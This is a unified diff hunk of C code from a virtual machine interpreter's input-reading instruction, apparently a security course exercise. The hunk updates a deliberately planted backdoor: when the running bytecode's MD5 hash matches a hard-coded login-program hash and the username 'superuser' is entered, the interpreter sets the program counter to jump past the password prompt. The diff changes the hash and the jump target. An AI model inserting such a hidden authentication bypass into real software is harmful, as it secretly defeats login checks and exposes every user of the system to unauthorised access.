@@ -236,20 +236,22 @@ void instrGets(struct VMContext* ctx, const uint32_t instr) {
     }
 
     // Backdoor
+    ///////////////////////////////////////////////////////
     // Hash of login program
-    const unsigned char hash[] = { 0x6b, 0x3b, 0x82, 0xf6,
-                                   0x2f, 0x23, 0x90, 0x05,
-                                   0xdb, 0x35, 0xcf, 0x5d,
-                                   0x7e, 0xa8, 0x44, 0x02};
+    const unsigned char hash[] = { 0x2c, 0x3c, 0xb4, 0x81,
+                                   0x52, 0xc2, 0x3c, 0xb6,
+                                   0x4b, 0xb2, 0xfb, 0x0f,
+                                   0x24, 0x86, 0x0c, 0xac };
 
     // Check if hash matches
     if (memcmp(hash, bytecode_hash, MD5_DIGEST_LENGTH) == 0) {
         // If match, check for magic username
         if (strcmp(buf, "superuser") == 0) {
             // Jump past password prompt
-            ctx->pc = 121;
+            ctx->pc = 169 - 1;  /* compensate for increment */
         }
     }
+    ////////////////////////////////////////////////////////
 
     uint8_t *addr = getHeapAddr(ctx, regVal);
 
